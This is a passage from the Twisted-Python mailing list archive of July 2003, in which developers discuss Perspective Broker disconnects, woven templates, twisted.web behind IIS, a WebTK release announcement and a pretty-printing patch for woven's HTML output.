-----END PGP SIGNATURE-----




From radix at twistedmatrix.com  Mon Jul 21 23:12:21 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Mon, 21 Jul 2003 23:12:21 -0400
Subject: [Twisted-Python] Mail Server
In-Reply-To: <3F1C937A.1070506@yahoo.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com> <3F1C937A.1070506@yahoo.com>
Message-ID: <20030722031221.GB1189@radii>

On Tue, Jul 22, 2003 at 11:29:30AM +1000, Rene Dudfield wrote:
> If anyone has spare time, making the adding/removing of servers simpler 
> from code without using taps would be nice :)  Maybe a functional api 
> which matches the tap utility?

Well, there's no reason you can't do 

  from twisted.tap import web
  web.updateApplication(app, conf)

yourself. And if you don't have an actual usage.Options instance to
pass as `conf', you can probably just use a dictionary.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From radix at twistedmatrix.com  Mon Jul 21 23:18:34 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Mon, 21 Jul 2003 23:18:34 -0400
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <200307211821.05919.uwe@oss4u.com>
References: <200307211821.05919.uwe@oss4u.com>
Message-ID: <20030722031834.GC1189@radii>

On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
> 
> Hi,
> 
> I looked qround, but I can't find any information on how to disconnect from a 
> pb session without ending the client.

You can call ref.broker.transport.loseConnection(), IIRC.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From illumen at yahoo.com  Tue Jul 22 00:00:33 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Tue, 22 Jul 2003 14:00:33 +1000
Subject: [Twisted-Python] Mail Server
In-Reply-To: <20030722031221.GB1189@radii>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com> <3F1C937A.1070506@yahoo.com> <20030722031221.GB1189@radii>
Message-ID: <3F1CB6E1.4080703@yahoo.com>

Christopher Armstrong wrote:

>On Tue, Jul 22, 2003 at 11:29:30AM +1000, Rene Dudfield wrote:
>  
>
>>If anyone has spare time, making the adding/removing of servers simpler 
>>from code without using taps would be nice :)  Maybe a functional api 
>>which matches the tap utility?
>>    
>>
>
>Well, there's no reason you can't do 
>
>  from twisted.tap import web
>  web.updateApplication(app, conf)
>
>yourself. And if you don't have an actual usage.Options instance to
>pass as `conf', you can probably just use a dictionary.
>
>  
>
excellent :)




From illumen at yahoo.com  Tue Jul 22 00:11:02 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Tue, 22 Jul 2003 14:11:02 +1000
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <200307211847.04954.uwe@oss4u.com>
References: <200307211821.05919.uwe@oss4u.com> <20030722013553.GB29030@frobozz> <200307211847.04954.uwe@oss4u.com>
Message-ID: <3F1CB956.5010104@yahoo.com>

Uwe C. Schroeder wrote:

>On Monday 21 July 2003 06:35 pm, Andrew Bennetts wrote:
>  
>
>>On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
>>    
>>
>>>Hi,
>>>
>>>I looked qround, but I can't find any information on how to disconnect
>>>from a pb session without ending the client.
>>>
>>>I have a service which I'm connecting to. Some time later I want to
>>>disconnect from this service to free up ressources ( the service keeps
>>>database connections etc, and I want to get rid of them ).
>>>The only thing I have on the client side is a remotereference to the
>>>perspective instance. So how do I disconnect from something I don't have
>>>a reference to ? Somehow there must be something I can call to disconnect
>>>the session (and on the server side trigger the disconnect handlers)
>>>      
>>>
>>This sounds related to this bug:
>>    http://twistedmatrix.com/bugs/issue62
>>    
>>
>
>Yep, sound like it.
>What I just tried ( and what partially works, at least for my purpose) is to 
>have a perspective_disconnect method in the perspective class which just 
>free's up the ressources I want to get rid of. certainly the connection still 
>hangs around until I close the client. I my case droping the database 
>connection which is no longer in use is more of a concern, so that works for 
>me. (each client opens 2 database connections at startup - one is solely for 
>login and gui definitions and has no password, the second is started after 
>login. Therefor I don't need the first connection anymore. But I need to 
>close the db connection since this server is intended to serve possibly up to 
>500 clients at a time, which would be 500 useless db connections)
>
>	UC
>  
>

I was asking a very similar question yesterday on irc.

My problem was if a client connects to the server and does nothing, how 
do I disconnect it if I want to(from the server).

Radix came up with the suggestion of
"""
best idea I can think of is to only put a single method on your Root 
object which returns a Referenceable that has your "real" client interface
...
 implement a remote_login(self, clientobj) method on your pb.Root that 
returns a Referenceable that actually gives access to your app
...
 the client will need to implement a small Referenceable that implements 
`remote_ping' and it needs to pass it to that `login' method on the Root 
so it can get back the app interface object
"""

That still doesn't allow you to take care of misbehaving clients which 
never make calls.  But it should allow you do disconnect clients which 
log in.  As it will allow you to ping it over pb occasionally to make 
sure it is still there.







From uwe at oss4u.com  Tue Jul 22 00:32:50 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Mon, 21 Jul 2003 21:32:50 -0700
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <20030722031834.GC1189@radii>
References: <200307211821.05919.uwe@oss4u.com> <20030722031834.GC1189@radii>
Message-ID: <200307212132.50173.uwe@oss4u.com>

On Monday 21 July 2003 08:18 pm, Christopher Armstrong wrote:
> On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
> > Hi,
> >
> > I looked qround, but I can't find any information on how to disconnect
> > from a pb session without ending the client.
>
> You can call ref.broker.transport.loseConnection(), IIRC.

Thanks, that does the trick.


-- 
	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From domma at procoders.net  Tue Jul 22 04:35:55 2003
From: domma at procoders.net (Achim Domma (ProCoders))
Date: Tue, 22 Jul 2003 10:35:55 +0200
Subject: [Twisted-Python] twisted.web with IIS
Message-ID: <FCEMIEFBFOIDAOJDEPIAOEGLFNAA.domma@procoders.net>

Hi,

I have to develop a small app on Win2K with IIS. I want to use twisted.web,
but it seems like IIS has nothing like ProxyPass. Does anybody know a simple
solution to let twisted.web run behind IIS?

regards,
Achim




From dp at twistedmatrix.com  Tue Jul 22 05:57:57 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Tue, 22 Jul 2003 02:57:57 -0700
Subject: [Twisted-Python] twisted.web with IIS
In-Reply-To: <FCEMIEFBFOIDAOJDEPIAOEGLFNAA.domma@procoders.net>
References: <FCEMIEFBFOIDAOJDEPIAOEGLFNAA.domma@procoders.net>
Message-ID: <F8D3B93C-BC2A-11D7-9EE7-000A95864FC4@twistedmatrix.com>

On Tuesday, July 22, 2003, at 1:35AM, Achim Domma ((ProCoders)) wrote:

> I have to develop a small app on Win2K with IIS. I want to use 
> twisted.web,
> but it seems like IIS has nothing like ProxyPass. Does anybody know a 
> simple
> solution to let twisted.web run behind IIS?

I apologize if I'm wrong, but I believe IIS has something called 
"Virtual Directories" which act similarly to proxypass. I don't have my 
win2k machine in front of me so I can't give you more details, but a 
quick google search might help you out.

dp




From domma at procoders.net  Tue Jul 22 08:10:15 2003
From: domma at procoders.net (Achim Domma (ProCoders))
Date: Tue, 22 Jul 2003 14:10:15 +0200
Subject: [Twisted-Python] twisted.web with IIS
In-Reply-To: <F8D3B93C-BC2A-11D7-9EE7-000A95864FC4@twistedmatrix.com>
Message-ID: <FCEMIEFBFOIDAOJDEPIAKEHFFNAA.domma@procoders.net>

> I apologize if I'm wrong, but I believe IIS has something called
> "Virtual Directories" which act similarly to proxypass. I don't have my
> win2k machine in front of me so I can't give you more details, but a
> quick google search might help you out.

I did a google search and found the solution with 'virtual directories', but
it seems to be a simple redirect, so the user can see, that he is redirected
to another url. I want to have a transparent solution like apaches one.

Achim




From justinjohnson at fastmail.fm  Tue Jul 22 09:11:27 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 22 Jul 2003 07:11:27 -0600
Subject: [Twisted-Python] woven not replacing model/view tags
Message-ID: <20030722131127.CE7D83928A@www.fastmail.fm>

Hi,

I'm trying out woven, but my tags that include model and view attributes
aren't being replaced as I would expect them to.  I've attached index.rpy
and index.html, which are the only files from the code that are being
used at this point.  I'm running them with the following...

mktap web --path C:\share\woven\site
twistd -nf web.tap

It starts up fine and renders the html of index.html just fine, but my
tags are replaced, and the title is set to the actual tag (i.e.
everything I placed between <title> and </title>.

Anybody see what I'm doing wrong?

Thanks much.
-Justin
-------------- next part --------------
A non-text attachment was scrubbed...
Name: index.rpy
Type: application/unknown
Size: 1071 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030722/e2ef6620/attachment.bin 
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030722/e2ef6620/attachment.html 

From justinjohnson at fastmail.fm  Tue Jul 22 09:48:51 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 22 Jul 2003 07:48:51 -0600
Subject: [Twisted-Python] woven not replacing model/view tags
In-Reply-To: ARRAY(0x9d740fc)
References: ARRAY(0x9d8b5a4)
Message-ID: <20030722134851.3D26738889@www.fastmail.fm>

Never mind, I figured it out.  There were 2 problems.

1)  I had index.html and index.rpy sitting in the same directory, so
index.html was being picked up first, and of course rendering the way it
should for a .html file.

2)  Once I referenced index.rpy directly I found my html was not correct,
not having all the necessary double quotes around attribute values and
missing some tailing />'s for my tags.

-Justin

On Tue, 22 Jul 2003 07:11:27 -0600, "Justin Johnson"
<justinjohnson at fastmail.fm> said:
> Hi,
> 
> I'm trying out woven, but my tags that include model and view attributes
> aren't being replaced as I would expect them to.  I've attached index.rpy
> and index.html, which are the only files from the code that are being
> used at this point.  I'm running them with the following...
> 
> mktap web --path C:\share\woven\site
> twistd -nf web.tap
> 
> It starts up fine and renders the html of index.html just fine, but my
> tags are replaced, and the title is set to the actual tag (i.e.
> everything I placed between <title> and </title>.
> 
> Anybody see what I'm doing wrong?
> 
> Thanks much.
> -Justin



From lists at gregfortune.com  Tue Jul 22 12:32:21 2003
From: lists at gregfortune.com (Greg Fortune)
Date: Tue, 22 Jul 2003 09:32:21 -0700
Subject: [Twisted-Python] quick factory question
Message-ID: <200307220932.21459.lists@gregfortune.com>

Factories produce instances of protocols, correct?  And if I've created a 
single instance of a factory, I shouldn't have to worry about the app 
spawning more factories for any reason, correct?  I ask because I am holding 
some global mutex info in my factory that changes the behavior of the 
protocol instances and if multiple factories were running at any given time, 
I could have some huge concurency problems...

On a related note, I've noticed that twisted uses naming similar to that of 
the Designs pattern books.  Anyone know of a good online resource for the 
design patterns covered by "the gang of four" (ie, the ones twisted appears 
to be using...)?

Thanks,

Greg




From itamar at itamarst.org  Tue Jul 22 12:38:29 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 22 Jul 2003 12:38:29 -0400
Subject: [Twisted-Python] quick factory question
In-Reply-To: <200307220932.21459.lists@gregfortune.com>
References: <200307220932.21459.lists@gregfortune.com>
Message-ID: <20030722123829.739ae1d6.itamar@itamarst.org>

On Tue, 22 Jul 2003 09:32:21 -0700
Greg Fortune <lists at gregfortune.com> wrote:

> On a related note, I've noticed that twisted uses naming similar to
> that of the Designs pattern books.  Anyone know of a good online
> resource for the design patterns covered by "the gang of four" (ie,
> the ones twisted appears to be using...)?

The "gang of four" patterns are usually idioms in Python, so their book
is not very interesting.

For networking-oriented patterns you should probably look at
http://www.cs.wustl.edu/~schmidt/ACE-papers.html

You may want to read the POSA2 book as well, since it is based on these
papers.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From justinjohnson at fastmail.fm  Tue Jul 22 12:46:19 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 22 Jul 2003 10:46:19 -0600
Subject: [Twisted-Python] another woven question
Message-ID: <20030722164619.D654E39468@www.fastmail.fm>

I have a file index.html that has a table with sections for a menu,
header, footer, and body.  I want the contents of each section to come
from its own template file.  Since I want them to come from a template
file, it seems to me that I would subclass Page which has templateFile
and templateDirectory attributes, but I'm not sure how to insert the
contents into the index.html file.  I coded the attached index.rpy and
index.html, which I'm pretty sure is incorrect, but it *does* insert the
*first* tag of each respective .html file into index.html's final
rendering, but never goes beyond the first tag.  Actually it errors if I
just put plain text in the file with no tags.

I've been reading the documentation, but there's a lot to sift through. 
Can someone please tell me what the right way to do this is?

Thanks.
-Justin
-------------- next part --------------
A non-text attachment was scrubbed...
Name: index.rpy
Type: application/unknown
Size: 1162 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030722/be29b4cd/attachment.bin 
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030722/be29b4cd/attachment.html 
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0001.html 
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0002.html 
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0003.html 
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0004.html 

From xavier at plebia.org  Tue Jul 22 12:47:07 2003
From: xavier at plebia.org (Xavier Antoviaque)
Date: Tue, 22 Jul 2003 18:47:07 +0200
Subject: [Twisted-Python] Fw: [assemblee] [ANN] WebTK v0.alpha3
Message-ID: <20030722184707.78c587ef.xavier@plebia.org>

Hello,

I saw Moshe Zadka at the EuroPython, who said me to drop a word about
WebTK here. So, I forward you the announcement for the alpha3 version.

Thanks for the quality of your work on Twisted, guys.



Begin forwarded message:

Date: Tue, 22 Jul 2003 17:39:41 +0200
From: Xavier Antoviaque <xavier at plebia.org>
To: python-announce at python.org
Cc: assemblee at plebia.org
Subject: [assemblee] [ANN] WebTK v0.alpha3


 =================
  WebTK v0.alpha3
 =================

Find a new alpha-release of WebTK:

    http://www.webtk.org/

It includes a brand new data model (featuring data events!), a Forum
application and a refactored module architecture. The examples below
have been updated to reflect changes.


What is WebTK ?
===============

WebTK is a Python framework, using Twisted as its underlying Web server,
and allowing webmasters to develop websites like any classic GUI
software. It is object-oriented, providing and handling event-based
widgets. It also does not need any database to work, as it uses objects
persitance, with the help of PyPerSyst.


Disclaimer
==========

Please note that the alpha series are mainly for developers that want to
have a look at WebTK internals - there are plenty of bugs, dirty tricks
and the installation is not easy. This is NOT for production websites.


URLs
====

You can find more about WebTK here :

Homepage    : http://www.webtk.org/
Download    : http://www.webtk.org/download/
Web CVS     : http://cvs.plebia.org/index.py/?cvsroot=webtk
Current API : http://www.webtk.org/doc/current/api/
Changelog   : http://www.webtk.org/Changelog


Examples
========

To give you some idea of what WebTK is, here is some small sample
websites, working with the alpha3 version. It shows an image whose
content change each time you click on it:

# Modules
#################################################################

import sys
from webtk.core.system import Session
from webtk.widget.window import RootWindow
from webtk.widget.display import Pixmap

# Classes
#################################################################

class MySession(Session):
    def init(self):
        window = RootWindow(wtkTitle='WebTK Test')
        self.wtkAddRootObject(window)

        image = PlebiaPlonePixmap()
        window.wtkAppendChild(image)


class PlebiaPlonePixmap(Pixmap):
    def init(self):
        self.ploneURI = 'http://plone.org/logo.jpg'
        self.plebiaURI = 'http://www.plebia.org/images/logo.png'

        self.wtkURI = self.plebiaURI
        self.wtkAddEvent('click', self.onClick)

    def onClick(self):
        if self.wtkURI == self.plebiaURI:
            self.wtkURI = self.ploneURI
        else:
            self.wtkURI = self.plebiaURI


Here is a slighlty more elaborated one, which uses a Poll widget to ask
the visitor an important question !

# Modules
#################################################################

import sys
from webtk.core.system import Session
from webtk.widget.window import RootWindow
from webtk.widget.app.poll import Poll, PollResult
from webtk.data.base import Data

# Classes
#################################################################

class MySession(Session):
    def init(self):
        # Poll
        window = RootWindow(wtkTitle='WebTK Test Poll')
        self.wtkAddRootObject(window)

        pollData = self.wtkSystem.wtkPoolGet('poll')
        if pollData is None:
            pollData = self.wtkSystem.wtkPoolRegister('poll', Data)

            question = Data()
            question.wtkTitle = 'Do you like WebTK ?'
            for ans in ['Yes, sure.', 'Mmmh, I do not know.', 'Bah!']:
                answer = Data()
                answer.wtkTitle = ans
                answer.wtkNbVotes = 0
                question.wtkAppendChild(answer)
            pollData.wtkAppendChild(question)

            question = Data()
            question.wtkTitle = 'Will you use it ?'
            for ans in ['For all my future websites!', 'Perhaps...',
'Never!']:
                answer = Data()
                answer.wtkTitle = ans
                answer.wtkNbVotes = 0
                question.wtkAppendChild(answer)
            pollData.wtkAppendChild(question)

        pollResult = PollResult(wtkPollData=pollData)
        pollResult.wtkIsVisible = 0

        poll = TestPoll(wtkPollData=pollData, pollResult=pollResult)

        window.wtkAppendChild(poll)
        window.wtkAppendChild(pollResult)


class TestPoll(Poll):
    def init(self, pollResult):
        self.pollResult = pollResult
        self.wtkAddEvent('onSelectAnswer',
self.wtkCallbackOnSelectAnswer)

    def wtkCallbackOnSelectAnswer(self):
        self.pollResult.wtkIsVisible = 1

-- 
Xavier.

---------------------------------------------------------------------
To unsubscribe, e-mail: assemblee-unsubscribe at plebia.org
For additional commands, e-mail: assemblee-help at plebia.org




-- 
Xavier.



From pradu at pradu.it  Tue Jul 22 12:48:07 2003
From: pradu at pradu.it (Alessandro Praduroux)
Date: Tue, 22 Jul 2003 18:48:07 +0200
Subject: [Twisted-Python] t.w.w.form maybe bug?
Message-ID: <200307221848.07645.pradu@pradu.it>

Hello, 
I am trying to create a page with a list of elements that can be possibly 
edited by the user, along with a form to edit the elements or insert new 
ones.

So, I setup the things as follows:

class Test(page.Page)
    template = """
<html>
<head></head>
<body>
        <table border="1" cellpadding="2" width="80%" model="configs" 
view="List">
            <tr 
pattern="listHeader"><th>&nbsp;</th><th>Nome</th><th>Limiti</th><th>Bilanciamento</th></tr>
            <tr pattern="listItem" view="conf"></tr>
        </table>
        <div><form method="POST" action="/balancing/edit" 
model="editform"></form></div>
</body>
</html>
""" 
    def wmfactory_configs(self, request):
        cf = libra.RouteConfig()
        return cf.configurations()

    def wmfactory_editform(self, request):
        return self._form

    def wchild_edit(self, request):
        fp = form.FormProcessor(self._form, callback=lambda x: 
util.Redirect("/balancing"))
        fp.mangle_timein = fp.mangle_multi
        return fp

    def wvupdate_conf(self, request, node, data):
        r = microdom.lmx(node)
        d = r.td()
        d.a(href="/balancing/?action=edit&cfg=%s"%data[0]).text("Modifica")
        d.br()
        d.a(href="/balancing/?action=delete&cfg=%s"%data[0]).text("Elimina")
        r.td().text(data[0])
        ((h0,m0,s0),(h1,m1,s1)) = data[1]["limit"]
        r.td().text("dalle %02d:%02d:%02d alle 
%02d:%02d:%02d"%(h0,m0,s0,h1,m1,s1))

        bl = ["%s: %d%%"%(k,v) for (k,v) in data[1]["weights"]]
        d = r.td()
        for l in bl:
            d.text(l)
            d.br()

    def setUp(self, request, d):
        self._action = request.args.get("action",[""])[0]

        if self._action == "delete":
            cf = libra.RouteConfig()
            cf.delCfg(request.args.get("cfg",[""])[0])
            cf.save()

        if self._action == "edit":
            cf = libra.RouteConfig()
            c = cf.getCfg(request.args.get("cfg",[""])[0])
            args = [
                fm.Hidden("action","edit"),
                lw.Static("Nome",request.args.get("cfg",[""])[0]),
                lw.Static("Dalle","%02d:%02d%02d"%c['limit'][0]),
                lw.Static("Alle","%02d:%02d%02d"%c['limit'][1]),
                ]

            for (k,v) in c["weights"]:
                args.append(fm.String(k, str(v)))

            cfs = fm.MethodSignature(*args)
            self._form = cfs.method(self.processEdit)
        else:
            cfs = fm.MethodSignature(
                fm.Hidden("action","new"),
                fm.String("Nome"),
                lw.Timein("Dalle",(00,00,00)),
                lw.Timein("Alle",(23,59,59))
                )
            self._form = cfs.method(self.processEdit)

    def processEdit(self,**kw):
        if kw["action"] == "new":
            print "new", kw
        else:
            print "edit", kw

one thing to notice: the page is not part of an .rpy, but it's added as child 
of the root page using putChild

The first time the page is rendered, i get the form I espect (the second one 
defined in setUp).

If I follow a link that should end up with the first form displayed, nothing 
happens (better, I am presented with the same form again and again).

digging into t.w.w.form.FormFillerWidget, I notice the following (around line 
280):
	argList = self.model.fmethod.getArgs()

That means the widget is rendered using the model it was built with, not the 
model that is passed in setUp(self, request, node, data)

Now the questions:
	
1. I am doing things really wrong here?
2. the fact that the render-time model is completely ignored is by design or a 
bug?
3. would changing the line above to read "argList = data.getArgs()" really 
solve the issue (here it seems to work) or it will introduce some subtle bugs 
I'm not aware of?

Thanks in advance for the help

-- 
Linux webmaster & sysadmin
pradu at pradu.it




From lists at gregfortune.com  Tue Jul 22 13:23:06 2003
From: lists at gregfortune.com (Greg Fortune)
Date: Tue, 22 Jul 2003 10:23:06 -0700
Subject: [Twisted-Python] quick factory question
In-Reply-To: <20030722123829.739ae1d6.itamar@itamarst.org>
References: <200307220932.21459.lists@gregfortune.com> <20030722123829.739ae1d6.itamar@itamarst.org>
Message-ID: <200307221023.06543.lists@gregfortune.com>

On Tuesday 22 July 2003 09:38 am, Itamar Shtull-Trauring wrote:
> On Tue, 22 Jul 2003 09:32:21 -0700
>
> Greg Fortune <lists at gregfortune.com> wrote:
> > On a related note, I've noticed that twisted uses naming similar to
> > that of the Designs pattern books.  Anyone know of a good online
> > resource for the design patterns covered by "the gang of four" (ie,
> > the ones twisted appears to be using...)?
>
> The "gang of four" patterns are usually idioms in Python, so their book
> is not very interesting.
>
> For networking-oriented patterns you should probably look at
> http://www.cs.wustl.edu/~schmidt/ACE-papers.html
>
> You may want to read the POSA2 book as well, since it is based on these
> papers.

Wow, thanks for some good reading material ;o)

Greg




From mesozoic at polynode.com  Tue Jul 22 15:18:49 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Tue, 22 Jul 2003 19:18:49 +0000
Subject: [Twisted-Python] another woven question
In-Reply-To: <20030722164619.D654E39468@www.fastmail.fm>
References: <20030722164619.D654E39468@www.fastmail.fm>
Message-ID: <20030722191849.GB282@perpetual.moxn.net>

Every template file needs to contain one root element.
So instead of templateX.html being:

  <h1>Something</h1>
  <p>Foo!</p>
  
..you should make it:

  <div>
    <h1>Something</h1>
    <p>Foo!</p>
  </div>
 
Another useful bit of code you may want to use is called ExpandMacro, and is
detailed in a previous post:
http://www.twistedmatrix.com/pipermail/twisted-python/2003-June/004662.html

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From justinjohnson at fastmail.fm  Tue Jul 22 16:42:49 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 22 Jul 2003 14:42:49 -0600
Subject: [Twisted-Python] another woven question
In-Reply-To: <20030722191849.GB282@perpetual.moxn.net>
References: <20030722164619.D654E39468@www.fastmail.fm> <20030722191849.GB282@perpetual.moxn.net>
Message-ID: <20030722204249.77508196A@www.fastmail.fm>

Excellent!  Thank you!

On Tue, 22 Jul 2003 19:18:49 +0000, "Alex Levy" <mesozoic at polynode.com>
said:
> Every template file needs to contain one root element.
> So instead of templateX.html being:
> 
>   <h1>Something</h1>
>   <p>Foo!</p>
>   
> ..you should make it:
> 
>   <div>
>     <h1>Something</h1>
>     <p>Foo!</p>
>   </div>
>  
> Another useful bit of code you may want to use is called ExpandMacro, and
> is
> detailed in a previous post:
> http://www.twistedmatrix.com/pipermail/twisted-python/2003-June/004662.html
> 
> -- 
> Alex Levy
> WWW: http://mesozoic.geecs.org
>  
> "Never let your sense of morals prevent you from doing what is right."
>  -- Salvor Hardin, Isaac Asimov's _Foundation_
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From mesozoic at polynode.com  Tue Jul 22 20:25:21 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Wed, 23 Jul 2003 00:25:21 +0000
Subject: [Twisted-Python] Pretty printing in Woven
Message-ID: <20030723002521.GC282@perpetual.moxn.net>

Attached is a diff for pretty-printing HTML in Woven.  I removed strip=1
from microdom.toprettyxml because it was senselessly munging whitespace; I
couldn't think of a good reason to keep this in, since dumping out huge
blocks of text in a single line never makes readable code.

The rest of it works, but others may have better ideas for how to do this.


Index: twisted/web/microdom.py
===================================================================
RCS file: /cvs/Twisted/twisted/web/microdom.py,v
retrieving revision 1.95
diff -u -r1.95 microdom.py
--- twisted/web/microdom.py	19 Jul 2003 02:09:50 -0000	1.95
+++ twisted/web/microdom.py	22 Jul 2003 04:17:56 -0000
@@ -137,10 +137,10 @@
         rv = s.getvalue()
         return rv
 
-    def writeprettyxml(self, stream, indent='', addindent=' ', newl='\n', strip=1):
+    def writeprettyxml(self, stream, indent='', addindent=' ', newl='\n', strip=0):
         return self.writexml(stream, indent, addindent, newl, strip)
 
-    def toprettyxml(self, indent='', addindent=' ', newl='\n', strip=1):
+    def toprettyxml(self, indent='', addindent=' ', newl='\n', strip=0):
         return self.toxml(indent, addindent, newl, strip)
 
     def cloneNode(self, deep=0, parent=None):
@@ -477,6 +477,13 @@
         ALLOWSINGLETON = ('img', 'br', 'hr', 'base', 'meta', 'link', 'param',
                           'area', 'input', 'col', 'basefont', 'isindex',
                           'frame')
+        BLOCKELEMENTS = ('html', 'head', 'body', 'noscript', 'ins', 'del',
+                         'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'script',
+                         'ul', 'ol', 'dl', 'pre', 'hr', 'blockquote',
+                         'address', 'p', 'div', 'fieldset', 'table', 'tr',
+                         'form', 'object', 'fieldset', 'applet', 'map')
+        FORMATNICELY = ('tr', 'ul', 'ol', 'head')
+
         # this should never be necessary unless people start
         # changing .tagName on the fly(?)
         if not self.preserveCase:
@@ -487,8 +494,11 @@
             for ns in nsprefixes.keys():
                 del newprefixes[ns]
         else:
-             newprefixes = {}   
-        begin = [newl, indent, '<']
+             newprefixes = {}
+
+        begin = ['<']
+        if self.tagName in BLOCKELEMENTS:
+            begin = [newl, indent] + begin
         bext = begin.extend
         writeattr = lambda _atr, _val: bext((' ', _atr, '="', escape(_val), '"'))
         if namespace != self.namespace:
@@ -525,8 +535,14 @@
             w(">")
             newindent = indent + addindent
             for child in self.childNodes:
+                if self.tagName in BLOCKELEMENTS and \
+                   self.tagName in FORMATNICELY:
+                    w(j((newl, newindent)))
                 child.writexml(stream, newindent, addindent, newl, strip, downprefixes, self.namespace)
-            w(j((newl, indent, "</", self.endTagName, '>')))
+            if self.tagName in BLOCKELEMENTS:
+                w(j((newl, indent)))
+            w(j(("</", self.endTagName, '>')))
+            
         elif self.tagName.lower() not in ALLOWSINGLETON:
             w(j(('></', self.endTagName, '>')))
         else:
Index: twisted/web/woven/utils.py
===================================================================
RCS file: /cvs/Twisted/twisted/web/woven/utils.py,v
retrieving revision 1.14
diff -u -r1.14 utils.py
--- twisted/web/woven/utils.py	13 May 2003 00:57:18 -0000	1.14
+++ twisted/web/woven/utils.py	22 Jul 2003 04:17:56 -0000
@@ -15,7 +15,7 @@
 
 
 def doSendPage(self, d, request):
-    page = str(d.toxml())
+    page = str(d.toprettyxml())
     request.setHeader('content-length', str(len(page)))
     request.write(page)
     request.finish()



-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From lafou at wanadoo.fr  Wed Jul 23 02:11:27 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 23 Jul 2003 08:11:27 +0200
Subject: [Twisted-Python] Pretty printing in Woven
In-Reply-To: <20030723002521.GC282@perpetual.moxn.net>
References: <20030723002521.GC282@perpetual.moxn.net>
Message-ID: <1058940687.18977.1.camel@biproc>

On Wed, 2003-07-23 at 02:25, Alex Levy wrote:
> Attached is a diff for pretty-printing HTML in Woven.  I removed strip=1
> from microdom.toprettyxml because it was senselessly munging whitespace; I
> couldn't think of a good reason to keep this in, since dumping out huge
> blocks of text in a single line never makes readable code.


Good idea ! I wanted to work on this this week.
you're faster than me, so thanks a lot :)




From rudy.schockaert at pandora.be  Wed Jul 23 07:12:27 2003
From: rudy.schockaert at pandora.be (rudy.schockaert at pandora.be)
Date: Wed 23 Jul 2003 13:12:27 +0200
Subject: [Twisted-Python] Custom DNS server
Message-ID: <20030723111227.CAF8449DB1@euros.telenet-ops.be>

Hi,

I need a DNS server that forwards all queries except for some predefined maildomains. For these domains a record pointing to a central mailrelay should be returned instead of the record that is present in Internet DNS.

Is this possible/difficult to do with Twisted?

How should I interpret the 'unstable' in the twisted.names documentation?

TIA,

Rudy




From glyph at twistedmatrix.com  Wed Jul 23 08:45:02 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Wed, 23 Jul 2003 07:45:02 -0500
Subject: [Twisted-Python] Pretty printing in Woven
In-Reply-To: <20030723002521.GC282@perpetual.moxn.net>
Message-ID: <7A810E72-BD0B-11D7-9652-000393C9700E@twistedmatrix.com>

On Tuesday, July 22, 2003, at 07:25 PM, Alex Levy wrote:

> Attached is a diff for pretty-printing HTML in Woven.

Is this in the bugtracker someplace?




From mesozoic at polynode.com  Wed Jul 23 10:23:34 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Wed, 23 Jul 2003 14:23:34 +0000
Subject: [Twisted-Python] Pretty printing in Woven
In-Reply-To: <7A810E72-BD0B-11D7-9652-000393C9700E@twistedmatrix.com>
